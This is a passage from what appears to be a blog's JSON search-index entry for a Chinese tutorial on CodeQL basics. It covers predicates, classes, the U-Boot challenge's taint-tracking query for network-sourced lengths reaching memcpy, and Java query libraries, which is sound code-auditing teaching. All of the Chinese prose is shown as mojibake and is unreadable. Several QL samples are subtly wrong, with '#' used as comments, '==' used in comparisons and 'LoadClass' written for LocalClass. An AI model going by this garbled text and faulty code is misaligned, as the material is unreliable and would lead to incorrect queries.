","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.1 è°“è¯ åœ¨ CodeQL ä¸­ï¼Œå‡½æ•°å¹¶ä¸å«â€œå‡½æ•°â€ï¼Œå«åš Predicatesï¼ˆè°“è¯ï¼‰ã€‚ä¸ºäº†ä¾¿äºè¯´æ˜ï¼Œä¸‹æ–‡ä¸­çš„å‡½æ•°ä¸è°“è¯éƒ½æ˜¯æŒ‡ä»£åŒä¸€ä¸ªå†…å®¹ã€‚ è°“è¯çš„å®šä¹‰æ–¹å¼å¦‚ä¸‹ï¼š predicate name(type arg) { statements } å®šä¹‰è°“è¯æœ‰ä¸‰ä¸ªè¦ç´ ï¼š å…³é”®è¯ predicateï¼ˆå¦‚æœæ²¡æœ‰è¿”å›å€¼ï¼‰ï¼Œæˆ–è€…ç»“æœçš„ç±»å‹ï¼ˆå¦‚æœå½“å‰è°“è¯å†…å­˜åœ¨è¿”å›å€¼ï¼‰ è°“è¯çš„åç§° è°“è¯çš„å‚æ•°åˆ—è¡¨ è°“è¯ä¸»ä½“ 2.1.1 æ— è¿”å›å€¼çš„è°“è¯ æ— è¿”å›å€¼çš„è°“è¯ä»¥predicateå…³é”®è¯å¼€å¤´ã€‚è‹¥ä¼ å…¥çš„å€¼æ»¡è¶³è°“è¯ä¸»ä½“ä¸­çš„é€»è¾‘ï¼Œåˆ™è¯¥è°“è¯å°†ä¿ç•™è¯¥å€¼ã€‚ æ— è¿”å›å€¼è°“è¯çš„ä½¿ç”¨èŒƒå›´è¾ƒå°ï¼Œä½†ä»ç„¶åœ¨æŸäº›æƒ…å†µä¸‹æ‰®æ¼”äº†å¾ˆé‡è¦çš„ä¸€ä¸ªè§’è‰² ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ predicate isSmall(int i) { i in [1 .. 9] } from int i where isSmall(i) // å°†æ•´æ•°é›†åˆiä»æ­£æ— ç©·å¤§çš„æ•°æ®é›†å«ï¼Œé™åˆ¶è‡³ 1-9 select i // è¾“å‡º 1-9 çš„æ•°å­— è‹¥ä¼ å…¥çš„ i æ˜¯å°äº 10 çš„æ­£æ•´æ•°ï¼Œåˆ™ isSmall(i) å°†ä¼šä½¿å¾—ä¼ å…¥çš„é›†åˆ i åªä¿ç•™ç¬¦åˆæ¡ä»¶çš„å€¼ï¼Œå…¶ä»–å€¼å°†ä¼šè¢«èˆå¼ƒã€‚ 2.1.2 æœ‰è¿”å›å€¼çš„è°“è¯ å½“éœ€è¦å°†æŸäº›ç»“æœä»è°“è¯ä¸­è¿”å›æ—¶ï¼Œä¸ç¼–ç¨‹è¯­è¨€çš„ return è¯­å¥ä¸åŒçš„æ˜¯ï¼Œè°“è¯ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªç‰¹æ®Šå˜é‡ resultã€‚è°“è¯ä¸»ä½“çš„è¯­æ³•åªæ˜¯ä¸ºäº†è¡¨è¿°é€»è¾‘ä¹‹é—´çš„å…³ç³»ï¼Œå› æ­¤åŠ¡å¿…ä¸è¦ç”¨ä¸€èˆ¬ç¼–ç¨‹è¯­è¨€çš„è¯­æ³•æ¥ç†è§£ã€‚ int getSuccessor(int i) { // è‹¥ä¼ å…¥çš„ i ä½äº 1-9 å†…ï¼Œåˆ™è¿”å› i+1 result = i + 1 and i in [1 .. 9] } select getSuccessor(3) // è¾“å‡º4 select getSuccessor(33) // ä¸è¾“å‡ºä»»ä½•ä¿¡æ¯ åœ¨è°“è¯ä¸»ä½“ä¸­ï¼Œresult å˜é‡å¯ä»¥åƒä¸€èˆ¬å˜é‡ä¸€æ ·æ­£å¸¸ä½¿ç”¨ï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯è¿™ä¸ªå˜é‡å†…çš„æ•°æ®å°†ä¼šè¢«è¿”å›ã€‚ string getANeighbor(string country) { country = \"France\" and result = \"Belgium\" or country = \"France\" and result = \"Germany\" or country = \"Germany\" and result = \"Austria\" or country = \"Germany\" and result = \"Belgium\" } select getANeighbor(\"France\") // è¿”å›ä¸¤ä¸ªæ¡ç›®ï¼Œ\"Belgium\" ä¸ \"Germany\" è°“è¯ä¸å…è®¸æè¿°çš„æ•°æ®é›†åˆä¸ªæ•°ä¸é™äºæœ‰é™æ•°é‡å¤§å°çš„ã€‚ä¸¾ä¸ªä¾‹å­ï¼š // è¯¥è°“è¯å°†ä½¿å¾—ç¼–è¯‘æŠ¥é”™ int multiplyBy4(int i) { // i æ˜¯ä¸€ä¸ªæ•°æ®é›†åˆï¼Œæ­¤æ—¶è¯¥é›†åˆå¯èƒ½æ˜¯ã€Œæ— é™å¤§å°ã€ // result é›†åˆè¢«è®¾ç½®ä¸º i*4ï¼Œæ„å‘³ç€ result é›†åˆçš„å¤§å°æœ‰å¯èƒ½ä¹Ÿæ˜¯æ— é™å¤§å° result = i * 4 } ä½†å¦‚æœæˆ‘ä»¬ä»ç„¶éœ€è¦å®šä¹‰è¿™ç±»å‡½æ•°ï¼Œåˆ™å¿…é¡»é™åˆ¶é›†åˆæ•°æ®å¤§å°ï¼ŒåŒæ—¶æ·»åŠ ä¸€ä¸ª bindingset æ ‡æ³¨ã€‚è¯¥æ ‡æ³¨å°†ä¼šå£°æ˜è°“è¯ plusOne æ‰€åŒ…å«çš„æ•°æ®é›†åˆæ˜¯æœ‰é™çš„ï¼Œå‰ææ˜¯ i ç»‘å®šåˆ°æœ‰é™æ•°é‡çš„æ•°æ®é›†åˆã€‚ bindingset[x] bindingset[y] predicate plusOne(int x, int y) { x + 1 = y } from int x, int y where y = 42 and plusOne(x, y) select x, y ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:2:1","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.2 ç±» åœ¨ CodeQL ä¸­çš„ç±»ï¼Œå¹¶ä¸æ„å‘³ç€å»ºç«‹ä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œè€Œåªæ˜¯è¡¨ç¤ºç‰¹å®šä¸€ç±»çš„æ•°æ®é›†åˆï¼Œå®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä¸‰ä¸ªæ­¥éª¤ï¼š ä½¿ç”¨å…³é”®å­—class èµ·ä¸€ä¸ªç±»åï¼Œå…¶ä¸­ç±»åå¿…é¡»æ˜¯é¦–å­—æ¯å¤§å†™çš„ã€‚ ç¡®å®šæ˜¯ä»å“ªä¸ªç±»ä¸­æ´¾ç”Ÿå‡ºæ¥çš„ å…¶ä¸­ï¼ŒåŸºæœ¬ç±»å‹ booleanã€floatã€intã€string ä»¥åŠ date ä¹Ÿç®—åœ¨å†…ã€‚ å¦‚ä¸‹æ˜¯å®˜æ–¹çš„ä¸€ä¸ªæ ·ä¾‹ï¼š class OneTwoThree extends int { OneTwoThree() { // characteristic predicate this = 1 or this = 2 or this = 3 } string getAString() { // member predicate result = \"One, two or three: \" + this.toString() } predicate isEven() { // member predicate this in [1 .. 2] } } from OneTwoThree i where i = 1 or i.getAString() = \"One, two or three: 2\" select i // è¾“å‡º 1 å’Œ 2 å…¶ä¸­ï¼Œç‰¹å¾è°“è¯ç±»ä¼¼äºç±»çš„æ„é€ å‡½æ•°ï¼Œå®ƒå°†ä¼šè¿›ä¸€æ­¥é™åˆ¶å½“å‰ç±»æ‰€è¡¨ç¤ºæ•°æ®çš„é›†åˆã€‚å®ƒå°†æ•°æ®é›†åˆä»åŸå…ˆçš„ Int é›†ï¼Œè¿›ä¸€æ­¥é™åˆ¶è‡³ 1-3 è¿™ä¸ªèŒƒå›´ã€‚this å˜é‡è¡¨ç¤ºçš„æ˜¯å½“å‰ç±»ä¸­æ‰€åŒ…å«çš„æ•°æ®é›†åˆã€‚ä¸ result å˜é‡ç±»ä¼¼ï¼Œthis åŒæ ·æ˜¯ç”¨äºè¡¨ç¤ºæ•°æ®é›†åˆç›´æ¥çš„å…³ç³»ã€‚ æ­¤å¤–ï¼Œåœ¨ç‰¹å¾è°“è¯ä¸­ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„ä¸€ä¸ªå…³é”®å­—æ˜¯ existsã€‚è¯¥å…³é”®å­—çš„è¯­æ³•å¦‚ä¸‹ï¼š exists(\u003cvariable declarations\u003e | \u003cformula\u003e) // ä»¥ä¸‹ä¸¤ä¸ª exists æ‰€è¡¨è¾¾çš„æ„æ€ç­‰ä»·ã€‚ exists(\u003cvariable declarations\u003e | \u003cformula 1\u003e | \u003cformula 2\u003e exists(\u003cvariable declarations\u003e | \u003cformula 1\u003e and \u003cformula 2\u003e è¿™ä¸ªå…³é”®å­—çš„ä½¿ç”¨å¼•å…¥äº†ä¸€äº›æ–°çš„å˜é‡ã€‚å¦‚æœå˜é‡ä¸­è‡³å°‘æœ‰ä¸€ç»„å€¼å¯ä»¥ä½¿ formula æˆç«‹ï¼Œé‚£ä¹ˆè¯¥å€¼å°†è¢«ä¿ç•™ã€‚ ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š import cpp class NetworkByteSwap extends Expr{ NetworkByteSwap() { // å¯¹äºMacroInvocationè¿™ä¸ªå¤§ç±»çš„æ•°æ®é›†åˆæ¥è¯´ï¼Œ exists(MacroInvocation mi | // å¦‚æœå­˜åœ¨å®è°ƒç”¨ï¼Œå…¶å®åç§°æ»¡è¶³ç‰¹å®šæ­£åˆ™è¡¨è¾¾å¼ mi.getMacroName().regexpMatch(\"ntoh(s|l|ll)\") and // å°†è¿™ç±»æ•°æ®ä¿å­˜è‡³å½“å‰ç±»ä¸­ this = mi.getExpr() ) } } from NetworkByteSwap n select n, \"Network byte swap\" ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:2:2","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"3 CodeQL U-Boot Challenge åœ¨ Github Learning Lab ä¸­ï¼Œæœ‰ä¸€ä¸ªç”¨äºå­¦ä¹  CodeQL çš„å…¥é—¨è¯¾ç¨‹ - CodeQL U-Boot Challenge (C/C++)](https://lab.github.com/GitHubtraining/codeql-u-boot-challenge-(cc++)) ç¼–å†™ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢ï¼Œç”¨äºæŸ¥è¯¢strlenå‡½æ•°çš„å®šä¹‰ä½ç½®ã€‚ import cpp from Function f where f.getName() = \"strlen\" select f, \"a function named strlen\" åˆ†æè¿™ä¸ªç®€å•çš„æŸ¥è¯¢ï¼Œä¹‹åæŸ¥è¯¢ä¸€ä¸‹memcpyå‡½æ•° import cpp from Function f where f.getName() = \"memcpy\" select f, \"a function named memcpy\" ä½¿ç”¨ä¸åŒçš„ç±»ä»¥åŠä¸åŒçš„è°“è¯ã€‚è¿™é‡Œæˆ‘ä»¬ç¼–å†™ QL æŸ¥æ‰¾åä¸º ntohsã€ntohl ä»¥åŠ ntohllçš„å®å®šä¹‰ã€‚ import cpp from Macro macro # where macro.getName() = \"ntohs\" or macro.getName() = \"ntohl\" or macro.getName() = \"ntohll\" where macro.getName().regexpMatch(\"ntoh(s|l|ll)\") select macro ä½¿ç”¨åŒå˜é‡ã€‚é€šè¿‡ä½¿ç”¨å¤šä¸ªå˜é‡æ¥æè¿°å¤æ‚çš„ä»£ç å…³ç³»ï¼ŒæŸ¥è¯¢ç‰¹å®šå‡½æ•°çš„è°ƒç”¨ä½ç½®ã€‚ import cpp from FunctionCall c, Function f where c.getTarget() = f and f.getName() == \"memcpy\" select c ä½¿ç”¨ Step6 çš„æŠ€å·§ï¼ŒæŸ¥è¯¢å®å®šä¹‰çš„è°ƒç”¨ä½ç½®ã€‚ import cpp from MacroInvocation mi where mi.getMacro().getName().regexpMatch(\"ntoh(s|l|ll)\") select mi æ”¹å˜ select çš„è¾“å‡ºã€‚æŸ¥æ‰¾è¿™äº›å®è°ƒç”¨æ‰€æ‰©å±•åˆ°çš„é¡¶çº§è¡¨è¾¾å¼(å®å±•å¼€)ã€‚ import cpp from MacroInvocation mi where mi.getMacro().getName().regexpMatch(\"ntoh(s|l|ll)\") select mi.getExpr() # æ³¨æ„è¿™é‡Œçš„.getExpr() å®ç°ä¸€ä¸ªç±»ã€‚ç”¨ exists å…³é”®å­—æ¥å¼•å…¥ä¸€ä¸ªä¸´æ—¶å˜é‡ï¼Œä»¥è®¾ç½®å½“å‰ç±»çš„æ•°æ®é›†åˆï¼›ç‰¹å¾è°“è¯åœ¨å£°æ˜æ—¶ä¼šè¢«è°ƒç”¨ä»¥ç¡®å®šå½“å‰ç±»çš„èŒƒå›´ï¼Œç±»ä¼¼äº C++ æ„é€ å‡½æ•°ã€‚ ç‰¹å¾è°“è¯åœ¨å£°æ˜æ—¶ä¼šè¢«è°ƒç”¨ä»¥ç¡®å®šå½“å‰ç±»çš„èŒƒå›´ï¼Œç±»ä¼¼äº C++ æ„é€ å‡½æ•°ã€‚æŸ¥è¯¢è¯­å¥ä¸­çš„ç±»ä¸­ï¼Œå…ˆé€šè¿‡ exists é‡è¯åˆ›å»ºä¸€ä¸ªä¸´æ—¶å˜é‡ mi æ¥è¡¨ç¤ºè¢«è°ƒç”¨çš„å®çš„åå­—ï¼Œå¦‚æœè¢«è°ƒç”¨çš„çš„å®å±•å¼€åå’Œå½“å‰ä»£ç ç‰‡æ®µç›¸ç­‰ï¼Œåˆ™è¿™ä¸ªè¡¨è¾¾å¼å±äºè¿™ä¸ªé›†åˆã€‚ import cpp class NetworkByteSwap extends Expr { NetworkByteSwap() { exists(MacroInvocation mi | mi.getMacroName().regexpMatch(\"ntoh(s|l|ll)\") and this = mi.getExpr() ) } } from NetworkByteSwap n select n, \"Network byte swap\" æ±¡ç‚¹è¿½è¸ª å€ŸåŠ©å‰é¢å‡ æ­¥ï¼ŒåŸºæœ¬æè¿°äº† CodeQL çš„ä½¿ç”¨ã€‚æœ€åä¸€ä¸ªæµ‹è¯•æ˜¯ä½¿ç”¨ CodeQL è¿›è¡Œæ±¡ç‚¹è¿½è¸ªã€‚è¿™é‡Œä½¿ç”¨äº† CodeQL çš„å…¨å±€æ±¡ç‚¹è¿½è¸ª (Global taint tracking)ã€‚æ–°å®šä¹‰çš„ Config ç±»ç»§æ‰¿äº TaintTracking::Configurationã€‚ç±»ä¸­é‡è½½çš„ isSource è°“è¯­å®šä¹‰ä¸ºæ±¡ç‚¹çš„æºå¤´ï¼Œè€Œ isSink å®šä¹‰ä¸ºæ±¡ç‚¹æ±‡èšç‚¹ã€‚ æœ‰æ—¶å€™ï¼Œè¿œç¨‹è¾“å…¥çš„æ•°æ®å¯èƒ½ç»è¿‡ ntoh å‡½æ•°å¤„ç†ï¼Œé€šè¿‡è½¬æ¢å­—èŠ‚åºå¾—åˆ°ç›¸åº”çš„æ•°å­—ã€‚è€Œ memcpy çš„ç¬¬ 2 ä¸ªå‚æ•°å¦‚æœæ§åˆ¶ä¸å½“ï¼Œå¯é€ æˆæ•°æ®æº¢å‡ºã€‚å°†ä¸Šé¢ä¸¤ä¸ªç»“è®ºç»“åˆèµ·æ¥ï¼Œå¦‚æœæœ‰ä¸€ä¸ªè¿œç¨‹è¾“å…¥çš„æ•°æ®é€šè¿‡å­—èŠ‚åºå˜æ¢å¾—åˆ°çš„æ•°å­—ï¼Œåœ¨æœªç»è¿‡æ ¡éªŒçš„æƒ…å†µä¸‹ï¼Œä½œä¸ºäº† memcpy çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½é€ æˆæ•°æ®æº¢å‡ºã€‚ åœ¨ isSource ä¸­ï¼Œåˆ¤æ–­ source çš„ Expr æ˜¯å¦æ˜¯ NetworkByteSwap è¿™ä¸ªç±»ï¼Œæ¥åˆ¤æ–­æ±¡ç‚¹çš„æºå¤´ã€‚ åœ¨ isSink ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†è¾…åŠ©ç±» FunctionCall åˆ¤æ–­å‡½æ•°è°ƒç”¨æ˜¯å¦ä¸º memcpy ä¸” sink çš„ä»£ç ç‰‡æ®µæ˜¯å¦ä¸º memcpy çš„ç¬¬äºŒä¸ªå‚æ•°ï¼›æœ€åä¸€å¥åˆ™æ˜¯åˆ¤æ–­å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦ä¸ºå¸¸é‡ï¼Œå¦‚æœä¸ºå¸¸é‡çš„è¯åŸºæœ¬ä¸å¯èƒ½å‡ºç°é—®é¢˜ï¼Œæ‰€æœ‰å¿½ç•¥ã€‚ import cpp import semmle.code.cpp.dataflow.TaintTracking import DataFlow::PathGraph # è®¾ç½®ç”¨äºäº¤æ¢ç½‘ç»œæ•°æ®çš„ç±» class NetworkByteSwap extends Expr { NetworkByteSwap() { exists(MacroInvocation mi | mi.getMacroName().regexpMatch(\"ntoh(s|l|ll)\") and this = mi.getExpr() ) } } # è®¾ç½®æ±¡ç‚¹è·Ÿè¸ªçš„åˆ†æä¿¡æ¯ class Config extends TaintTracking::Configuration { Config() { this = \"NetworkToMemFuncLength\" } override predicate isSource(DataFlow::Node source) { source.asExpr() instanceof NetworkByteSwap } override predicate isSink(DataFlow::Node sink) { exists(FunctionCall call | call.getTarget().getName() = \"memcpy\" and sink.asExpr() = call.getArgument(2) and not call.getArgument(1).isConstant() ) } } # æŸ¥è¯¢ from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink where cfg.hasFlowPath(source, sink) select sink, source, sink, \"Network byte swap flows to memcpy\" ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4 CodeQL for Java ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:4:0","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.1 åŸºæœ¬æŸ¥è¯¢ å¯¹ if è¯­å¥ä¸­çš„å†—ä½™ä»£ç è¿›è¡Œæœç´¢ï¼Œä¾‹å¦‚ç©ºçš„ then åˆ†æ”¯ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š if (error) {} ç¼–å†™æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š # å¼•å…¥ Java æ ‡å‡†æŸ¥è¯¢åº“ import java # å®šä¹‰æŸ¥è¯¢å˜é‡ï¼Œå£°æ˜ IfStmt å˜é‡ä»£è¡¨ if è¯­å¥ # å£°æ˜ BlockStmt å˜é‡ä»£è¡¨ then ä»£ç å— from IfStmt ifstmt, BlockStmt block # å®šä¹‰æŸ¥è¯¢çš„é™åˆ¶æ¡ä»¶ where ifstmt.getThen() = block and block.getNumStmt() = 0 # å°†ç»“æœè¿”å›åˆ°æ§åˆ¶å° select \u003cprogram element\u003e, \"\u003calert message\u003e\" select ifstmt, \"This 'if' statement is redundant.\" æŸ¥è¯¢ä¼˜åŒ– ç¼–å†™ QL ä»£ç çš„è¿‡ç¨‹æ˜¯ä¸€ä¸ªè¿­ä»£çš„è¿‡ç¨‹ï¼Œåœ¨æœ€åˆçš„æŸ¥è¯¢ç»“æœä¸­å¯èƒ½ä¼šå‡ºç°ä¸€äº›ã€Œéé¢„æœŸã€çš„ç»“æœï¼Œå› æ­¤éœ€è¦é€šè¿‡ä¸æ–­ä¿®æ”¹ï¼Œæ¥å®Œå–„ QL æŸ¥è¯¢ä»£ç ã€‚ åœ¨å¦‚ä¸‹ç¤ºä¾‹ä»£ç ä¸­ï¼Œç©ºçš„ else if åˆ†æ”¯çš„ç¡®æœ‰ç€è‡ªå·±çš„ç”¨é€”ï¼Œå› æ­¤ä¼˜åŒ–æŸ¥è¯¢ï¼šå½“ if è¯­å¥ä¸­å…·æœ‰ else åˆ†æ”¯æ—¶ï¼Œè®¤ä¸ºç©ºåˆ†æ”¯æœ‰è‡ªå·±çš„ä½œç”¨ï¼Œå¿½ç•¥ç©ºåˆ†æ”¯ã€‚ if (...) { ... } else if (\"-verbose\".equals(option)) { // nothing to do - handled earlier } else { error(\"unrecognized option\"); } æŸ¥è¯¢è¯­å¥ä¼˜åŒ–ï¼š where ifstmt.getThen() = block and block.getNumStmt() = 0 and not exists(ifstmt.getElse()) ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:4:1","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"4.2 CodeQL ä¸­çš„ Java åº“ åœ¨åˆ†æä¸€ä¸ª Java ç¨‹åºæ—¶ï¼Œå¯ä»¥åˆ©ç”¨ CodeQL åº“ä¸­æä¾›çš„å¤§é‡ç±»çš„é›†åˆã€‚è¯¥åº“ç”¨äºåˆ†æä» Java é¡¹ç›®ä¸­æå–çš„ CodeQL æ•°æ®åº“ã€‚è¿™ä¸ªåº“ä¸­çš„ç±»ä»¥é¢å‘å¯¹è±¡çš„å½¢å¼å‘ˆç°æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå¹¶æä¾›æŠ½è±¡å’Œè°“è¯æ¥å®Œæˆå¸¸è§çš„åˆ†æä»»åŠ¡ã€‚ è¿™ä¸ªåº“æ˜¯ä½œä¸ºä¸€ç»„ QL æ¨¡å—å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯æ‰©å±•åä¸º .qll çš„æ–‡ä»¶ã€‚java.qll æ¨¡å—å¯¼å…¥äº†æ‰€æœ‰çš„æ ¸å¿ƒ Java åº“æ¨¡å—ï¼Œå› æ­¤å¯ä»¥é€šè¿‡åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨ import java æ¥ä½¿ç”¨è¯¥åº“ã€‚ 4.2.1 äº”å¤§ç±»åº“ Program Elementsï¼Œç¨‹åºå…ƒç´ ï¼Œä¾‹å¦‚ç±»å’Œæ–¹æ³• AST nodesï¼ŒæŠ½è±¡æ ‘èŠ‚ç‚¹ï¼Œä¾‹å¦‚è¯­å¥å’Œè¡¨è¾¾å¼ Metadataï¼Œå…ƒæ•°æ®ï¼Œä¾‹å¦‚æ³¨è§£å’Œæ³¨é‡Š metricsï¼Œè®¡ç®—æŒ‡æ ‡ï¼Œä¾‹å¦‚å¾ªç¯å¤æ‚åº¦ Call Graghï¼Œè°ƒç”¨å›¾ 4.2.2 ç¨‹åºå…ƒç´  è¿™äº›ç±»åŒ…æ‹¬ï¼šåŒ…ï¼ˆPackageï¼‰ã€ç¼–è¯‘å•å…ƒï¼ˆCompilationUnitï¼‰ã€ç±»å‹ï¼ˆTypeï¼‰ã€æ–¹æ³•ï¼ˆMethodï¼‰ã€æ„é€ å‡½æ•°ï¼ˆConstructorï¼‰å’Œå˜é‡ï¼ˆVariableï¼‰ã€‚ å®ƒä»¬å…±åŒçš„è¶…ç±»æ˜¯ Elementï¼Œå®ƒæä¾›äº†å¸¸ç”¨çš„æˆå‘˜è°“è¯ï¼Œç”¨äºç¡®å®šç¨‹åºå…ƒç´ çš„åç§°å’Œæ£€æŸ¥ä¸¤ä¸ªå…ƒç´ æ˜¯å¦ç›¸äº’åµŒå¥—ã€‚ å› æ­¤å¯ä»¥æ–¹ä¾¿çš„å¼•ç”¨ä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ å‡½æ•°çš„å…ƒç´ ã€‚æ­¤å¤–ï¼ŒCallable ç±»æ˜¯ Method å’Œ Constructor çš„å…±åŒè¶…ç±»ï¼Œå¯ä»¥ç”¨äºæ­¤ç›®çš„ã€‚ ç±»å‹ï¼šTypes ç±» Type æœ‰è®¸å¤šå­ç±»ï¼Œç”¨äºè¡¨ç¤ºä¸åŒç§ç±»çš„ç±»å‹ã€‚ PrimitiveType è¡¨ç¤ºåŸå§‹ç±»å‹ï¼Œå³ boolean, byte, char, double, float, int, long, shortï¼›QL ä¹Ÿå°† void å’Œ nulltype å½’ä¸ºåŸå§‹ç±»å‹ã€‚ RefType æ˜¯éåŸå§‹ç±»å‹ï¼Œå®ƒåˆæœ‰å‡ ä¸ªå­ç±»ã€‚ Class interface enum Array ä¾‹å¦‚ï¼Œè¦æŸ¥è¯¢ç¨‹åºä¸­æ‰€æœ‰çš„ int ç±»å‹çš„å˜é‡ï¼š import java from Variable v, PrimitiveType pt where pt = v.getType() and pt.hasName(\"int\") select v å¼•ç”¨ç±»å‹ä¹Ÿæ˜¯æ ¹æ®å®ƒä»¬çš„å£°æ˜èŒƒå›´æ¥åˆ†ç±»çš„ã€‚ TopLevelType ä»£è¡¨åœ¨ç¼–è¯‘å•å…ƒ(ä¸€ä¸ª .java æ–‡ä»¶)çš„é¡¶å±‚å£°æ˜çš„ç±»ã€‚ NestedType æ˜¯ä¸€ä¸ªåœ¨å¦ä¸€ä¸ªç±»å‹å†…å£°æ˜çš„ç±»å‹ã€‚ LoadClassï¼šåœ¨æˆå‘˜æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¸­å£°æ˜çš„ç±» AnonymousClassï¼šåŒ¿åç±» ä¾‹å¦‚ï¼Œå¦‚ä¸‹æŸ¥è¯¢å¯ä»¥æ‰¾åˆ°æ‰€æœ‰åç§°ä¸å…¶ç¼–è¯‘å•å…ƒä¸ä¸€è‡´çš„é¡¶å±‚ç±»å‹ã€‚ import java from TopLevelType tl where tl.getName() != tl.getCompilationUnit().getName() select tl æœ€åï¼Œè¯¥åº“è¿˜æœ‰ä¸€äº›å•ä¾‹å­ç±»ï¼Œå¦‚ï¼šTypeObjectã€TypeCloneableã€TypeRuntimeã€TypeSerializableã€TypeStringã€TypeSystem å’Œ TypeClassã€‚æ¯ä¸ª CodeQL ç±»éƒ½ä»£è¡¨å…¶åç§°æ‰€æš—ç¤ºçš„æ ‡å‡† Java ç±»ã€‚ å†™ä¸€ä¸ªæ‰¾åˆ°æ‰€æœ‰ç›´æ¥ç»§æ‰¿ Object çš„åµŒå¥—ç±»çš„æŸ¥è¯¢ï¼š import java from NestedClass nc where nc.getASupertype() instanceof TypeObject select nc æ³›å‹ï¼šGenerics GenericType æ˜¯ GenericInterface æˆ– GenericClassã€‚å®ƒä»£è¡¨äº†ä¸€ä¸ªæ³›å‹å‹å£°æ˜ï¼Œå¦‚ Java æ ‡å‡†åº“ä¸­çš„æ¥å£ java.util.Map: package java.util.; public interface Map\u003cK, V\u003e { int size(); // ... } ç±»å‹å‚æ•°ï¼Œå¦‚æœ¬ä¾‹ä¸­çš„ K å’Œ Vï¼Œç”± TypeVariable ç±»è¡¨ç¤ºã€‚ ä¸€ä¸ªæ³›å‹çš„å‚æ•°åŒ–å®ä¾‹æä¾›äº†ä¸€ä¸ªå…·ä½“å®ç°è¯¥ç±»å‹çš„å‚æ•°ï¼Œå¦‚ Map\u003cString, File\u003eã€‚è¿™æ ·çš„ç±»å‹ç”± ParameterizedType è¡¨ç¤ºï¼Œå®ƒä¸ GenericType ä¸åŒã€‚è¦ä» ParameterizedType åˆ°å…¶ç›¸åº”çš„ GenericTypeï¼Œå¯ä»¥ä½¿ç”¨è°“è¯ getSourceDeclarationã€‚ ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æŸ¥è¯¢æ¥æ‰¾åˆ° java.util.Map çš„æ‰€æœ‰å‚æ•°åŒ–å®ä¾‹ã€‚ import java from GenericInterface map, ParameterizedType pt where map.hasQualifiedName(\"java.util\", \"Map\") and pt.getSourceDeclaration() = map select pt ä¸€èˆ¬æ¥è¯´ï¼Œæ³›å‹éœ€è¦é™åˆ¶ç±»å‹å‚æ•°å¯ä»¥ä¸å“ªäº›ç±»å‹ç»‘å®šã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªä»å­—ç¬¦ä¸²åˆ°æ•°å­—çš„æ˜ å°„ç±»å‹å¯ä»¥è¢«å£°æ˜å¦‚ä¸‹ï¼š class StringToNumMap\u003cN extends Number\u003e implements Map\u003cString, N\u003e { // ... } è¿™æ„å‘³ç€ StringToNumberMap çš„å‚æ•°åŒ–å®ä¾‹åªèƒ½ä½¿ç”¨ Number æˆ–å®ƒçš„ä¸€ä¸ªå­ç±»å‹æ¥å®ä¾‹åŒ–ç±»å‹å‚æ•° Nï¼Œè€Œä¸èƒ½ç”¨å…¶å®ƒç±»ï¼Œå¦‚è¯´ Fileã€‚æˆ‘ä»¬è¯´ N æ˜¯ä¸€ä¸ªæœ‰ç•Œçš„ç±»å‹å‚æ•°ï¼ŒNumber æ˜¯å®ƒçš„ä¸Šç•Œã€‚åœ¨ QL ä¸­ï¼Œä¸€ä¸ªç±»å‹å˜é‡å¯ä»¥ç”¨è°“è¯ getATypeBound æ¥æŸ¥è¯¢å®ƒçš„ç±»å‹è¾¹ç•Œã€‚ç±»å‹è¾¹ç•Œæœ¬èº«ç”± TypeBound ç±»è¡¨ç¤ºï¼Œå®ƒæœ‰ä¸€ä¸ªæˆå‘˜è°“è¯ getType æ¥æ£€ç´¢å˜é‡è¢«çº¦æŸçš„ç±»å‹ã€‚ å¦‚ä¸‹çš„æŸ¥è¯¢æ‰¾åˆ°æ‰€æœ‰ä»¥ Number 